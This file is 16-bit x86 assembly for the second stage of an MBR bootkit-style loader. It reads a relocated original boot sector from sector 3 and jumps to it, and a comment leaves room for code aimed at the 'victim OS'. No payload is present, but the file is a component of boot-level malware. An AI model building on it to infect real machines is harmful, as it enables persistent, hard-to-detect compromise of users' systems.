; the second stage of the loader

ORG 1000h      
BITS 16 
jmp boot

msg1 db 'failed to read the original boot sector!',13,10,0

boot:            ; setup the stack
     xor ax,ax
     mov ds,ax
     mov es,ax
     mov ss,ax
     mov sp,1000h  

;; here we could put other code that performs other actions depending of the victim OS

load_original_mbr: 
     mov dl,80h
     xor ax,ax
     int 13h ; reset drive
     mov es,ax   ; read at    
     mov bx,7c00H ; 0000:7c00
     mov ah,02h  ; read function
     mov al,01h ; read only one sector
     mov cx,03h ; sector 3
     mov dh,0 
     mov dl,80h    
     int 13h ; read the sector
     jc failed_to_read

jump_to_original_mbr: ; here the original mbr gets the control
     db 0Eah ; jump at
     dw 7c00h ; memory location
     dw 0    ; 0000:7c00h

failed_to_read:
     mov ah,0eh
     mov bx,0007
     xor si,si

p:
     mov al, [msg1+si]    
     test al,al
     jz exit
     int 10h             
     inc si
     jmp p

exit:
     ret

times 510-($-$$) db 0    
dw 0aa55h ; this is useless here
